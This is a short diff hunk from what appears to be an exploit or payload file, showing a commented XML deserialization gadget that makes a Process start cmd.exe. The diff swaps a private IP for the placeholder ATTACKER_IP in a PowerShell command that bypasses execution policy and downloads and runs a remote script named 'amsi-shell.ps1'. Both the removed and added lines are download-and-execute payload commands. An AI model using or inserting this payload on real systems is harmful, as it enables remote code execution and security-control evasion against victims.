@@ -7,7 +7,7 @@
 #       <MethodName>Start</MethodName>
 #       <MethodParameters>
 #         <string>cmd.exe</string>
-#         <string>/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')</string>
+#         <string>/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payloads/amsi-shell.ps1')</string>
 #       </MethodParameters>
 #       <ObjectInstance xsi:type="Process"/>
 #     </ProjectedProperty0>
